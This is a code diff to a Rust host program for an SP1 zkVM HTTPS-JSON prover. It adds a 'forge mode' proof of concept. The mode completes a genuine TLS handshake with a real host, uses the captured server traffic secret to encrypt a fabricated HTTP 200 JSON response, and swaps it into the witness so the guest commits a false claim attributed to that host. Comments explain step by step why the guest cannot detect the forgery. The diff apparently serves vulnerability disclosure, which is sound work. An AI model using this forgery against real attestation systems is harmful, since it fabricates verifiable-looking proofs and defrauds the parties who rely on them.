@@ -16,7 +16,7 @@ use sp1_sdk::{
 use capture::{make_capturing_provider, CapturingStream, KeyMaterial};
 use keylog::CapturingKeyLog;
 use sp1_https_json_shared::PublicClaim;
-use witness::assemble_witness;
+use witness::{assemble_witness, forge_app_record};
 
 const ELF: Elf = include_elf!("sp1-https-json-program");
 
@@ -37,6 +37,28 @@ struct Args {
     /// If set, generate a full STARK proof; otherwise just execute (faster for dev)
     #[arg(long)]
     prove: bool,
+
+    /// PoC switch: when set, the client completes only the TLS handshake to
+    /// the named URL and then stops — no HTTP request is ever sent. The
+    /// inbound `encrypted_app_records` that the witness would normally carry
+    /// are discarded and replaced by ONE record we mint ourselves: a
+    /// well-formed `HTTP/1.1 200 OK` whose body is this JSON string.
+    ///
+    /// The guest accepts the forged witness and commits a `PublicClaim` that
+    /// names the real host (the leaf cert is genuine), the requested field,
+    /// the prover-supplied threshold, and the prover-supplied value.
+    ///
+    /// Run this against any real HTTPS host:
+    ///
+    ///     --url https://www.google.com/ \
+    ///     --field /score --threshold 1000 \
+    ///     --forge-json '{"score":1337}'
+    ///
+    /// → guest commits `(www.google.com, /score, 1000, 1337)`. Google sent
+    /// no JSON; we never asked for any. See `PR_BODY.md` for the full
+    /// writeup of why the guest cannot detect this.
+    #[arg(long)]
+    forge_json: Option<String>,
 }
 
 fn main() -> Result<()> {
@@ -91,30 +113,59 @@ fn main() -> Result<()> {
     let mut stream = CapturingStream::new(tcp);
 
     let mut tls = rustls::ClientConnection::new(Arc::new(config), server_name)?;
-    let mut joined = rustls::Stream::new(&mut tls, &mut stream);
 
-    // Write HTTP/1.1 GET request.
-    use std::io::Write;
-    write!(
-        joined,
-        "GET {query_path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nAccept: application/json\r\n\r\n"
-    )?;
+    if args.forge_json.is_some() {
+        // ───────────────────────────────────────────────────────────────────
+        // Forge mode, part 1 of 2: handshake only — no HTTP.
+        //
+        // We need just enough of a real TLS 1.3 session to populate the
+        // *transcript-dependent* parts of the witness with material that
+        // checks out against a real Mozilla trust anchor:
+        //
+        //   • genuine certificate chain for `host` (parsed from Certificate)
+        //   • genuine CertificateVerify signed by the real leaf cert key
+        //   • genuine ECDHE key share (server_ecdh_public from ServerHello)
+        //   • genuine ServerFinished HMAC
+        //   • SERVER_HANDSHAKE_TRAFFIC_SECRET + SERVER_TRAFFIC_SECRET_0 from
+        //     rustls' KeyLog hook (the second one is the key to the forgery)
+        //
+        // None of that requires an HTTP request — the handshake messages
+        // and the key schedule are decided entirely by the TLS handshake.
+        // So we drive rustls to handshake-complete and stop. The TCP write
+        // buffer never sees a single byte of `GET ... HTTP/1.1`.
+        eprintln!(
+            "FORGE MODE: completing TLS handshake to {host}:{port}; sending NO HTTP request"
+        );
+        while tls.is_handshaking() {
+            tls.complete_io(&mut stream)?;
+        }
+        eprintln!("FORGE MODE: handshake complete");
+    } else {
+        let mut joined = rustls::Stream::new(&mut tls, &mut stream);
 
-    // Read full response.
-    use std::io::Read;
-    let mut response_bytes = Vec::new();
-    joined.read_to_end(&mut response_bytes)?;
+        // Write HTTP/1.1 GET request.
+        use std::io::Write;
+        write!(
+            joined,
+            "GET {query_path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nAccept: application/json\r\n\r\n"
+        )?;
 
-    let response_str = String::from_utf8_lossy(&response_bytes);
+        // Read full response.
+        use std::io::Read;
+        let mut response_bytes = Vec::new();
+        joined.read_to_end(&mut response_bytes)?;
 
-    // Extract HTTP body (after \r\n\r\n).
-    let body = response_str
-        .split("\r\n\r\n")
-        .nth(1)
-        .unwrap_or("")
-        .to_string();
+        let response_str = String::from_utf8_lossy(&response_bytes);
 
-    println!("Response body: {body}");
+        // Extract HTTP body (after \r\n\r\n).
+        let body = response_str
+            .split("\r\n\r\n")
+            .nth(1)
+            .unwrap_or("")
+            .to_string();
+
+        println!("Response body: {body}");
+    }
 
     // -----------------------------------------------------------------------
     // 3. Assemble the TLS witness.
@@ -127,6 +178,7 @@ fn main() -> Result<()> {
         .context("KeyMaterial not captured — handshake did not complete?")?;
 
     let secrets = secrets_arc.lock().unwrap().clone();
+    let server_app_secret_opt = secrets.server_app_traffic_secret.clone();
     let hs_secret = secrets
         .server_hs_traffic_secret
         .context("SERVER_HANDSHAKE_TRAFFIC_SECRET not captured")?;
@@ -138,7 +190,7 @@ fn main() -> Result<()> {
         hs_secret.len()
     );
 
-    let tls_witness = assemble_witness(
+    let mut tls_witness = assemble_witness(
         &stream.inbound,
         &stream.outbound,
         km.client_private,
@@ -152,6 +204,69 @@ fn main() -> Result<()> {
         tls_witness.encrypted_app_records.len(),
         tls_witness.cert_verify_msg.len(),
     );
+
+    // ───────────────────────────────────────────────────────────────────────
+    // Forge mode, part 2 of 2: mint a fake server ApplicationData record.
+    //
+    // The witness assembled above is otherwise authentic — same certs, same
+    // CertVerify, same key schedule. We only swap out the application-data
+    // payload, which is the one part of the proof the verifier cares about.
+    //
+    // The forgery works because:
+    //
+    //   1. RFC 8446 §7.1 derives `server_application_traffic_secret_0`
+    //      deterministically from `Master-Secret` and the handshake
+    //      transcript hash. `Master-Secret` itself is derived from
+    //      `ECDHE_shared`, which the CLIENT already holds (it picked
+    //      `client_ecdh_private`). So the client can compute the server's
+    //      application write secret with no further server interaction.
+    //
+    //   2. rustls' `KeyLog` callback hands us that very secret as
+    //      `SERVER_TRAFFIC_SECRET_0` (`server_app_secret_opt` below).
+    //
+    //   3. `forge_app_record` packs an arbitrary plaintext under
+    //      `AES-128-GCM(key=HKDF(traffic_secret, "key"), iv=HKDF(...))`,
+    //      producing a record that authenticates under the same AEAD key
+    //      the (honest, in-zkVM) guest re-derives from the same handshake.
+    //
+    //   4. The guest has no information that lets it distinguish a record
+    //      produced in step 3 from a record the real server would have
+    //      produced: both authenticate under `K_s`, both decrypt cleanly,
+    //      both yield bytes the HTTP parser accepts.
+    //
+    // The HTTP envelope below is the minimal shape that survives the guest's
+    // `response.split("\r\n\r\n").nth(1)` and `serde_json::from_str(body)`.
+    if let Some(json) = &args.forge_json {
+        let server_app_secret = server_app_secret_opt
+            .context("SERVER_TRAFFIC_SECRET_0 not captured by keylog")?;
+
+        // Minimal, well-formed HTTP/1.1 response. Headers are not parsed by
+        // the guest — only the body after `\r\n\r\n` matters — but we keep
+        // `Content-Length` accurate so any future header-aware logic stays
+        // happy. `Connection: close` is just cosmetic (no socket here).
+        let fake_http = format!(
+            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+            json.as_bytes().len(),
+            json
+        );
+
+        // seq = 0: this is the only application record we put in the witness,
+        // and the guest iterates with `.enumerate()`, so seq must start at 0.
+        let forged = forge_app_record(&server_app_secret, 0, fake_http.as_bytes())?;
+
+        eprintln!(
+            "FORGE MODE: replacing {} captured app record(s) with 1 forged record ({} bytes)",
+            tls_witness.encrypted_app_records.len(),
+            forged.len()
+        );
+        eprintln!("FORGE MODE: forged HTTP body: {json}");
+
+        // Drop any NewSessionTicket / KeyUpdate records the server may have
+        // pushed after Finished. We only keep our forgery. The guest will
+        // try seq=0,1,... against `encrypted_app_records` — with a single
+        // element, there is nothing else to decrypt.
+        tls_witness.encrypted_app_records = vec![forged];
+    }
 
     // -----------------------------------------------------------------------
     // 4. Write inputs to the guest stdin.
